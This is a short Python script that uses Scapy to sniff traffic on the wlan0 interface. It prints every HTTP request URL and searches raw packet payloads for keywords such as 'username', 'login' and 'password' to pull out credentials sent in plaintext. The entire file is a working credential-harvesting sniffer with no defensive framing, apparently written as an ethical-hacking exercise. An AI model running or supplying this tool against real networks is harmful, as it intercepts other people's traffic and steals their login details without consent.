#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def snif(interface):
    scapy.sniff(iface=interface, store=False, prn=pack)


def pack(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

        print(f'[+] HTTP Request >> {url}')
        if packet.haslayer(scapy.Raw):
            print(raw(packet))


def raw(packet):
    load = f"{packet[scapy.Raw].load}"
    keywords = ["username", "user", "login", "password", "pass"]
    for keyword in keywords:
        if load:
            if keyword in load:
                return (f'\n\n[+] Possible username/password found >> {load}\n\n')

    return load



snif('wlan0')
